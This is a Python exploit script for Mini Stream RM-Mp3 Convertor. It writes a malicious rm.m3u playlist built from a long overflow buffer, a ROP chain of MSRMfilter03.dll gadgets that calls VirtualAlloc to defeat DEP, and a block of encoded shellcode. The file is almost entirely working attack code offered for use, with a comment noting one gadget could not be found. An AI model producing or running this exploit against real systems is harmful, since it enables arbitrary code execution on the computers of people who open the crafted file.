import struct

__author__ = 'Sahil Dhar'
__product__ = 'Mini Stream RM-Mp3 Convertor'

def p32(addr):
	return struct.pack("<I",addr)
	
junk = "http://."
junk += "A"*26104



'''
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 
'''

# 0x10026f2b :  # POP EAX # RETN    ** [MSRMfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}

def create_rop_chain():
	
	# Generated by mona, customized according to this exploit
	
	rop_gadgets = [
	  0x1002d61a,  # POP EAX # RETN [MSRMfilter03.dll] 
	  0xaaaaaaaa,
	  0x10032078,  # ptr to &VirtualAlloc() [IAT MSRMfilter03.dll]
	  0x1002e0c8,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSRMfilter03.dll] 
	  0x1001a788,  # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN [MSRMfilter03.dll] 
	  0x41414141,  # Filler (compensate)
	  0x41414141,  # Filler (compensate)
	  0x41414141,  # Filler (compensate)
	  0x1002e7f3,  # POP EBP # RETN [MSRMfilter03.dll] 
	  0x1001b058,  # & push esp # ret  [MSRMfilter03.dll]
	  0x1002d980,  # POP EDX # RETN
	  0x55555555,
	  0x1001ca03,  # POP EBX # RETN
	  0x55555555,
	  0x10024ece,  # ADD EDX,EBX # POP EBX # RETN 0x10 
	  0x55556556,
	  0x10024ece,  # ADD EDX,EBX # POP EBX # RETN 0x10 
	  0xbbbbbbbb,
	  0xcccccccc, 
	  0xcccccccc,
	  0xcccccccc,
	  0xcccccccc,
	  0x10012a05,  #0x10012a05 (RVA : 0x00012a05) : # POP EBX # RETN    ** [MSRMfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}
	  0xdddddddd,
	  0xdddddddd,
	  0xdddddddd,
	  0xdddddddd,
	  0xAAAAAAAA,  # put delta into ebx (-> put 0x00000001 into ebx)
      0x1002d61a,  # 0x1002d61a,  # POP EAX # RETN [MSRMfilter03.dll] 
      0x55555557,
	  0x10028857,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+8] # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
	  0x10014177,  # POP ECX # RETN [MSRMfilter03.dll] 
	  0xffffffff,  #  
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
	  0x10024a0e,  # POP EDI # RETN [MSRMfilter03.dll] 
	  0x1001c121,  # RETN (ROP NOP) [MSRMfilter03.dll]
	  0x1002b93e,  # POP EAX # RETN [MSRMfilter03.dll] 
	  0x10024004,  # nop
	  0x1002bc07,  # [-] Unable to find pushad gadget

	  
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()



# Shellcode 

buf =  "\x33\xc0\x33\xd2"
buf += "\xda\xd2\xbe\xc5\x57\x9d\x5e\xd9\x74\x24\xf4\x5f\x31"
buf += "\xc9\xb1\x53\x31\x77\x17\x83\xef\xfc\x03\xb2\x44\x7f"
buf += "\xab\xc0\x83\xfd\x54\x38\x54\x62\xdc\xdd\x65\xa2\xba"
buf += "\x96\xd6\x12\xc8\xfa\xda\xd9\x9c\xee\x69\xaf\x08\x01"
buf += "\xd9\x1a\x6f\x2c\xda\x37\x53\x2f\x58\x4a\x80\x8f\x61"
buf += "\x85\xd5\xce\xa6\xf8\x14\x82\x7f\x76\x8a\x32\x0b\xc2"
buf += "\x17\xb9\x47\xc2\x1f\x5e\x1f\xe5\x0e\xf1\x2b\xbc\x90"
buf += "\xf0\xf8\xb4\x98\xea\x1d\xf0\x53\x81\xd6\x8e\x65\x43"
buf += "\x27\x6e\xc9\xaa\x87\x9d\x13\xeb\x20\x7e\x66\x05\x53"
buf += "\x03\x71\xd2\x29\xdf\xf4\xc0\x8a\x94\xaf\x2c\x2a\x78"
buf += "\x29\xa7\x20\x35\x3d\xef\x24\xc8\x92\x84\x51\x41\x15"
buf += "\x4a\xd0\x11\x32\x4e\xb8\xc2\x5b\xd7\x64\xa4\x64\x07"
buf += "\xc7\x19\xc1\x4c\xea\x4e\x78\x0f\x63\xa2\xb1\xaf\x73"
buf += "\xac\xc2\xdc\x41\x73\x79\x4a\xea\xfc\xa7\x8d\x0d\xd7"
buf += "\x10\x01\xf0\xd8\x60\x08\x37\x8c\x30\x22\x9e\xad\xda"
buf += "\xb2\x1f\x78\x76\xba\x86\xd3\x65\x47\x78\x84\x29\xe7"
buf += "\x11\xce\xa5\xd8\x02\xf1\x6f\x71\xaa\x0c\x90\x5f\x93"
buf += "\x98\x76\xf5\xf3\xcc\x21\x61\x36\x2b\xfa\x16\x49\x19"
buf += "\x52\xb0\x02\x4b\x65\xbf\x92\x59\xc1\x57\x19\x8e\xd5"
buf += "\x46\x1e\x9b\x7d\x1f\x89\x51\xec\x52\x2b\x65\x25\x04"
buf += "\xc8\xf4\xa2\xd4\x87\xe4\x7c\x83\xc0\xdb\x74\x41\xfd"
buf += "\x42\x2f\x77\xfc\x13\x08\x33\xdb\xe7\x97\xba\xae\x5c"
buf += "\xbc\xac\x76\x5c\xf8\x98\x26\x0b\x56\x76\x81\xe5\x18"
buf += "\x20\x5b\x59\xf3\xa4\x1a\x91\xc4\xb2\x22\xfc\xb2\x5a"
buf += "\x92\xa9\x82\x65\x1b\x3e\x03\x1e\x41\xde\xec\xf5\xc1"
buf += "\xee\xa6\x57\x63\x67\x6f\x02\x31\xea\x90\xf9\x76\x13"
buf += "\x13\x0b\x07\xe0\x0b\x7e\x02\xac\x8b\x93\x7e\xbd\x79"
buf += "\x93\x2d\xbe\xab"





padding = "C"*(27008-len(junk)-len(rop_chain) - len(buf))
print padding
payload = junk + rop_chain  + buf + padding

print len(payload)
open("rm.m3u",'w').write(payload)

